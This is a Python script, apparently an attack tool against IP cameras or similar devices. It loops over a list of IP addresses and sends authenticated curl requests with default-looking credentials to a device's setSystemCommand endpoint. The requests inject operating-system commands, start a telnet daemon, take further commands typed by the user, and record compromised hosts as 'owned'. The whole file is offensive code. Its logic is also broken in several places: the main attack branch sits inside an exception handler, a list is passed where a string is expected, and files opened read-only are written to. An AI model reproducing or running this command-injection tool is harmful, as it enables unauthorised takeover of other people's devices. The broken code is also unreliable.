import os
import ipaddress
import shlex
import subprocess
import telnetlib
import sys


# TODO: change this to include IP + correct creds
def curlInjection(ip):
    # Fire up telnet server for use
    telenetCommand = "curl --user admin:DoNotErase 'http://192.168.1.33/setSystemCommand' " \
              "-H 'Content-Type: application/x-www-form-urlencoded' " \
              "--data 'ReplySuccessPage=docmd.htm&ReplyErrorPage=docmdhtm&SystemCommand=telnetd&ConfigSystemCommand=Save'"
    os.system(telenetCommand)


# inputs a list of commands
def commandInjectionList(cmdList):
    if len(cmdList) == 0:
        print("You didn't input any commands silly")
    else:
        for x in cmdList:
            inputCmd = "curl --user admin:DoNotErase 'http://192.168.1.33/setSystemCommand' " \
                             "-H 'Content-Type: application/x-www-form-urlencoded' " \
                             "--data 'ReplySuccessPage=docmd.htm&ReplyErrorPage=docmdhtm&SystemCommand=" + x + "&ConfigSystemCommand=Save'"
            os.system(inputCmd)


# inputs only one single command
def commandInjection(cmd):
    inputCmd = "curl --user admin:DoNotErase 'http://192.168.1.33/setSystemCommand' " \
               "-H 'Content-Type: application/x-www-form-urlencoded' " \
               "--data 'ReplySuccessPage=docmd.htm&ReplyErrorPage=docmdhtm&SystemCommand=" + cmd + "&ConfigSystemCommand=Save'"
    os.system(inputCmd)


def takePicGetPic(emailAddr):
    commandInjection('mail')
    commandInjection('')


if __name__ == '__main__':
    ipLog = open('ipList.txt')
    ownedDevice = open('theMemesOfProduction.txt')
    for x in ipLog:
        currIP = ipaddress.ip_address(x.strip())
        cmd = shlex.split("ping " + str(currIP))
        # ping the IP address
        try:
            output = subprocess.check_output(cmd)
        except:
            # If ping does not reach given IP skip the IP
            if subprocess.CalledProcessError:
                # Will print the command failed with its exit status
                print("The IP {0} is Not Reachable".format(cmd[-1]))
                pass
            # If it can reach the IP address, then we can continue the attack
            else:
                print("The IP {0} is Reachable".format(cmd[-1]))
                # Telnet injection stuff here
                curlInjection(x)
                # save IP address to a file of owned devices
                ownedDevice.write(x + '\n')
                # Camera's IP address
                HOST = x
                # brute force your way maybe?
                user = 'admin'
                password = 'admin'

                commandList = []
                isNotDone = True
                while(isNotDone):
                    print("please enter the commands you want to inject. Type 'esc' to escape")
                    text = input("what commands do you want to enter?")
                    if text.lower() == 'esc':
                        isNotDone = False
                    else:
                        commandList.append(text)
                print('running commands now, please be patient')
                commandInjection(commandList)
                print('your commands have been run on device ip:' + HOST)
